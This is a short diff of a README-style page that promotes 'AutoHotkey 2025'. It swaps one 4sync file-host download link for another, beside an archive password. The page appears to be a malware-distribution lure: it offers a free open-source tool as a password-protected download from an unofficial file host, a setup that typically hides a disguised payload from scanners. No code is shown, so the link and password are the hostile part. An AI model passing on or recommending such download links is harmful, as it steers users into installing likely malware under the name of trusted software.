@@ -4,7 +4,7 @@
 
 AutoHotkey is a powerful open-source scripting language for Windows that allows you to automate repetitive tasks, create custom hotkeys, and build interactive GUIs. With its lightweight and flexible syntax, AutoHotkey 2025 enhances productivity by enabling keyboard remapping, text expansion, and automated workflows.
 
-# [DOWNLOAD](https://www.4sync.com/s/feLmqkiGe)  
+# [DOWNLOAD](https://www.4sync.com/s/fzRHeXfDE)  
 ## PASSWORD: 1322
 
 <img width="1273" height="709" alt="Screenshot_1" src="https://github.com/user-attachments/assets/24cce268-4c10-48d6-86ef-abaa17b82c9c" />
